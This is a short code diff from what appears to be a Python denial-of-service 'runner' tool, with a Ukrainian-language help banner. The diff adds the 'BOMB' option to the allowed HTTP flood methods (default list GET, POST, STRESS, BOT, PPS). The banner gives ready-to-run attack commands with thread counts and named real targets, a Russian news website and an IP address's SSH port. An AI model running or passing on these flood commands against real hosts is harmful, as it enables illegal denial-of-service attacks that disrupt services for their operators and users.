@@ -217,7 +217,7 @@ def init_argparse() -> argparse.ArgumentParser:
         nargs='+',
         type=str.upper,
         default=['GET', 'POST', 'STRESS', 'BOT', 'PPS'],
-        choices=Methods.LAYER7_METHODS - {'DGB', 'BOMB', 'KILLER'},
+        choices=Methods.LAYER7_METHODS - {'DGB', 'KILLER'},
         help='List of HTTP(s) attack methods to use. Default is GET, POST, STRESS, BOT, PPS',
     )
     return parser
@@ -229,7 +229,7 @@ def print_banner(vpn_mode):
 
 - Навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
     python3 runner.py -t 3000 https://ria.ru tcp://194.54.14.131:22
-    
+
 - Інформація про хід атаки - прапорець `--debug`
     python3 runner.py --debug https://ria.ru tcp://194.54.14.131:22
 
